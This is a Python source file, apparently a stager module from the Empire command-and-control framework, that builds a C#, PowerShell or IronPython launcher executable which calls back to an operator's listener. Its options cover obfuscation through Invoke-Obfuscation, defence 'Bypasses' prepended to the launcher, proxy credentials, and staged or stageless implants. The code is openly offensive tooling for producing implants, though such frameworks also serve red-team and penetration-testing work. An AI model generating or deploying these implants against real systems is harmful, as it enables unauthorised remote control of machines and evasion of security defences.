from pathlib import Path

from empire.server.common.helpers import (
    strip_powershell_comments,
    strip_python_comments,
)
from empire.server.core.db.base import SessionLocal
from empire.server.core.exceptions import StagerGenerationException
from empire.server.utils.data_util import ps_convert_to_oneliner


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "C# PowerShell Launcher",
            "Authors": [
                {
                    "Name": "Anthony Rose",
                    "Handle": "@Cx01N",
                    "Link": "https://twitter.com/Cx01N_",
                },
                {
                    "Name": "Jake Krasnov",
                    "Handle": "@hubbl3",
                    "Link": "https://twitter.com/_Hubbl3",
                },
            ],
            "Description": "Generate a PowerShell C#  solution with embedded stager code that compiles to an exe",
            "Comments": ["Based on the work of @bneg"],
        }

        self.options = {
            "Language": {
                "Description": "Language of the stager to generate (powershell, csharp).",
                "Required": True,
                "Value": "csharp",
                "SuggestedValues": ["powershell", "csharp", "ironpython"],
                "Strict": True,
            },
            "DotNetVersion": {
                "Description": "Language of the stager to generate(powershell, csharp).",
                "Required": True,
                "Value": "net40",
                "SuggestedValues": ["net40", "net45"],
                "Strict": True,
            },
            "Listener": {
                "Description": "Listener to use.",
                "Required": True,
                "Value": "",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": True,
                "Value": "Sharpire.exe",
            },
            "Obfuscate": {
                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
                "DependsOn": [{"name": "Language", "values": ["powershell"]}],
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use.",
                "Required": False,
                "Value": r"Token\All\1",
                "DependsOn": [
                    {"name": "Language", "values": ["powershell"]},
                    {"name": "Obfuscate", "values": ["True"]},
                ],
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "",
            },
            "Staged": {
                "Description": "Allow agent to be staged",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        self.options.pop("Output", None)  # clear the previous output
        # staging options
        language = self.options["Language"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        proxy = self.options["Proxy"]["Value"]
        proxy_creds = self.options["ProxyCreds"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        dot_net_version = self.options["DotNetVersion"]["Value"]
        bypasses = self.options["Bypasses"]["Value"]
        obfuscate = self.options["Obfuscate"]["Value"]
        obfuscate_command = self.options["ObfuscateCommand"]["Value"]

        obfuscate_script = obfuscate.lower() == "true"

        # The per-stager Obfuscate option is gated to powershell via DependsOn,
        # so for csharp/ironpython fall back to the global ObfuscationConfig
        # (keyed on "csharp", same as the listener stage-serving path).
        if language.lower() in ("csharp", "ironpython"):
            with SessionLocal.begin() as db:
                obfuscation_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
                    db, "csharp"
                )
                obfuscate_script = bool(
                    obfuscation_config and obfuscation_config.enabled
                )

        staged = self.options["Staged"]["Value"].lower() == "true"

        if not staged and language != "csharp":
            launcher = self.mainMenu.stagergenv2.generate_stageless(self.options)

            if language == "powershell":
                launcher = ps_convert_to_oneliner(strip_powershell_comments(launcher))
            elif language == "ironpython":
                launcher = strip_python_comments(launcher)
        else:
            launcher = self.mainMenu.stagergenv2.generate_launcher(
                listener_name,
                language=language,
                encode=False,
                obfuscate=obfuscate_script,
                obfuscation_command=obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                bypasses=bypasses,
            )

        if not launcher or launcher.lower() == "failed":
            raise StagerGenerationException("Error in launcher command generation.")

        if language.lower() == "powershell":
            directory = self.mainMenu.stagergenv2.generate_powershell_exe(
                launcher, dot_net_version=dot_net_version, obfuscate=obfuscate_script
            )
            return Path(directory).read_bytes()

        if language.lower() == "csharp":
            return Path(launcher).read_bytes()

        if language.lower() == "ironpython":
            directory = self.mainMenu.stagergenv2.generate_python_exe(
                launcher, dot_net_version=dot_net_version, obfuscate=obfuscate_script
            )
            return Path(directory).read_bytes()

        raise StagerGenerationException("Invalid launcher language.")
